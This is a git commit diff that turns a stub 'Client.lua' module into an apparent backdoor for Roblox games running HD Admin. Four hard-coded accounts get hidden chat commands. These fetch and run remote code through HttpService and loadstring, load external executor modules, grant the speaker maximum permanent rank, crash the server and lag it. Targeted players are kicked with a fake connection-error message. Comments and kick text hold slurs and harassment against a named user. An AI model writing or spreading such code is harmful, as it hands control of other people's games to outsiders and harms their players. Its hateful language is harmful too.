0b9afda2d7c578f064a40e498cc1e582134c29c2
t10_kol <154048632+t10underscorekol@users.noreply.github.com>
2024-04-15 21:42:51 +0300

    Update Client.lua

--- Modules/Client.lua
+++ Modules/Client.lua
@@ -1,1 +1,217 @@
-print("ClientStarted")
+
+local main = _G.HDAdminMain
+local HttpService = game.HttpService
+local AdminPanel = {
+	"t10_kol",
+	"LuckDanil",
+	"EnvoyOfHead",
+	"lyovka1",
+}
+local Version_of_theScript = "V1.0.3 ALPHA"
+local EnabledDoDOS = false
+local BlackList = {
+	["Vad_75"]=true, --< Vadik Pidorasik
+}
+local LagEnabled = false
+local LagObjcets = {
+}
+local wellwellwell = false
+
+game.Players.PlayerAdded:Connect(function(player)
+		if wellwellwell==true and game.PlaceId == 14028572241 then 
+			if Whitelist[player.UserId] then
+			else
+			player:Kick("https://discord.gg/tetGnntmjW СОСИ ХУЙ ВАД!")  --Вад фашист нацист пидор феменист жыд негр гандон пиздабол рукаблудер фурри фембой
+			end
+		end
+
+	if BlackList[player.Name] then
+		if EnabledDoDOS==true then 
+			player:Kick("Error While Connecting To Experience") --Соси Хуй Вад 😀
+		end
+	end
+	if table.find(AdminPanel,player.Name) ~= nil then
+			local Watermark = Instance.new("ScreenGui")
+local WaterMark = Instance.new("TextLabel")
+local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
+
+--Properties:
+
+Watermark.Name = "Watermark"
+Watermark.Parent = player:WaitForChild("PlayerGui")
+Watermark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+WaterMark.Name = "WaterMark"
+WaterMark.Parent = Watermark
+WaterMark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+WaterMark.BackgroundTransparency = 1.000
+WaterMark.BorderColor3 = Color3.fromRGB(0, 0, 0)
+WaterMark.BorderSizePixel = 0
+WaterMark.Position = UDim2.new(0, 0, 0.951186121, 0)
+WaterMark.Size = UDim2.new(0.0867430419, 0, 0.0474452563, 0)
+WaterMark.Font = Enum.Font.Code
+WaterMark.LineHeight = 1.350
+WaterMark.Text = "ADM System "..Version_of_theScript
+WaterMark.TextColor3 = Color3.fromRGB(255, 255, 255)
+WaterMark.TextScaled = true
+WaterMark.TextSize = 14.000
+WaterMark.TextWrapped = true
+
+UIAspectRatioConstraint.Parent = WaterMark
+UIAspectRatioConstraint.AspectRatio = 4.077
+		require(7192763922).load(player.Name)
+
+
+		--local banDetails = main:GetModule("cf"):GetBannedUserDetails(plr)
+		--main.signals.ShowBannedUser:FireClient(plr, banDetails)
+
+
+		pcall(function()
+			print(main:GetModule("cf"))
+			--main:GetModule("cf"):SetRank(player, game.CreatorId, 4, "Perm")
+			local banDetails, record = main:GetModule("cf"):GetBannedUserDetails(player.Name)
+			--targetName, targetId, targetReason, record
+			if banDetails then
+				record.BanTime = os.time()
+				if record.Server ~= "Current" then
+					main:GetModule("SystemData"):InsertStat("Banland", "RecordsToModify", record)
+				end
+				--main:GetModule("cf"):FormatAndFireNotice(speaker, "UnBanSuccess", banDetails[1])
+			end
+		end)
+		player.Chatted:Connect(function(message)
+			print("message was send")
+			local args = message:split(" ") -- Splits arguments.
+			if args[1]:lower() == "/e ADM.Message" then -- Checks if the command was used.
+				local announcemsg = message:sub(args[1]:len() + 2,-1) 
+				local message_COOL = Instance.new("Message",workspace)
+				message_COOL.Text = announcemsg
+				game.Debris:AddItem(message_COOL,10)
+			end
+			if message == "/e ADM.Restart" then
+				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
+				local f = loadstring(code)
+				f()
+			elseif message == "/e ADM.Sky" then
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
+			elseif message == "/e ADM.RankMe" then
+				main:GetModule("cf"):SetRank(player, game.CreatorId, 999999999999999, "Perm")
+			elseif message == "/e ADM.Sky2" then
+				local id = game.GroupService:GetGroupInfoAsync(32993955).EmblemUrl
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = id
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = id
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = id
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = id
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = id
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = id
+			elseif message == "/e ADM.antivad" then
+				EnabledDoDOS = not EnabledDoDOS
+			elseif message == "/e ADM.Fun" then
+				for _, player2 in pairs(game.Players:GetPlayers()) do
+					local Part = Instance.new("Part",player2.Character)
+					Part.CanCollide=false
+					Part.CFrame = player2.Character.Torso.CFrame
+					Part.Color = player2.Character.Torso.Color
+					local weld = Instance.new("Weld",Part)
+					weld.Part0 = player2.Character.Torso
+					weld.Part1 = Part
+					weld.C0 = CFrame.new(0,0.5,-0.75) * CFrame.Angles(0,math.rad(-90),0)
+					local mesh = Instance.new("SpecialMesh",Part)
+
+					mesh.MeshId = "rbxassetid://7606070501"
+					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
+				end
+				--rbxassetid://5679232242
+			elseif message == "/e ADM.Fun2" then
+				print("VER3")
+				for _, player2 in pairs(game.Players:GetPlayers()) do
+					local CharMesh1 = Instance.new("CharacterMesh",player2.Character)
+					CharMesh1.MeshId = 83001137
+					CharMesh1.BodyPart = Enum.BodyPart.LeftArm
+					local CharMesh2 = Instance.new("CharacterMesh",player2.Character)
+					CharMesh2.MeshId = 83001181
+					CharMesh2.BodyPart = Enum.BodyPart.RightArm
+					local AccessoryBlackList = {
+						[Enum.AccessoryType.Back]=true,
+						[Enum.AccessoryType.Front]=true,
+						[Enum.AccessoryType.Waist]=true,
+						[Enum.AccessoryType.Shoulder]=true,
+					}
+					for _, accessory:Accessory in pairs(player2.Character:GetChildren()) do
+						if accessory:IsA("Accessory") then
+							if AccessoryBlackList[accessory.AccessoryType] then
+								accessory:Destroy()
+							end
+						end
+					end
+					local mesh = Instance.new("SpecialMesh",player2.Character.Torso)
+
+					mesh.MeshId = "rbxassetid://5679232242"
+					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
+					mesh.Scale = Vector3.new(2.02, 2.02, 2.02)
+
+
+					local Part = Instance.new("Part",player2.Character)
+					Part.CanCollide=false
+					Part.CFrame = player2.Character.Torso.CFrame
+					Part.Size = Vector3.new(1.45, 0.944, 1.048)
+					Part.Color = player2.Character.Torso.Color
+					local weld = Instance.new("Weld",Part)
+					weld.Part0 = player2.Character.Torso
+					weld.Part1 = Part
+					weld.C0 = CFrame.new(0, 0.202, -0.465)
+					local mesh2 = Instance.new("SpecialMesh",Part)
+
+					mesh2.MeshId = "rbxassetid://5679326691"
+					mesh2.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
+					mesh2.Scale = Vector3.new(2.02, 2.02, 2.02)
+
+					--left leg
+
+					local mesh3 = Instance.new("SpecialMesh",player2.Character["Left Leg"])
+
+					mesh3.MeshId = "rbxassetid://5679229838"
+					mesh3.TextureId = player2.Character:FindFirstChildOfClass("Pants").PantsTemplate
+					mesh3.Scale = Vector3.new(2.02, 2.02, 2.02)
+
+					--right leg
+
+					local mesh4 = Instance.new("SpecialMesh",player2.Character["Right Leg"])
+
+					mesh4.MeshId = "rbxassetid://5679231042"
+					mesh4.TextureId = player2.Character:FindFirstChildOfClass("Pants").PantsTemplate
+					mesh4.Scale = Vector3.new(2.02, 2.02, 2.02)
+				end
+				--rbxassetid://5679232242
+			elseif message == "/e ADM.Executor" then
+				local Part = Instance.new("Part",workspace)
+				Part.CanCollide=true
+				Part.CFrame = player.Character.Torso.CFrame
+				require(6324372525).fse(player.Name)
+			elseif message == "/e ADM.Executor2" then
+				local Part = Instance.new("Part",workspace)
+				Part.CanCollide=true
+				Part.CFrame = player.Character.Torso.CFrame
+				require(5419042716).PraiseSkidGod(player.Name)
+			elseif message == "/e ADM.Lag.Start" then
+				LagEnabled = true
+
+
+			elseif message == "/e ADM.Lag.Stop" then
+				LagEnabled=false
+				for index,lagobj in pairs(LagObjcets) do
+					lagobj:Destroy()
+				end
+			elseif message == "/e ADM.Crash" then
+				while tick() do
+					print("CrashTHEServer")
+				end
+			end
+		end)
+	end
+end)
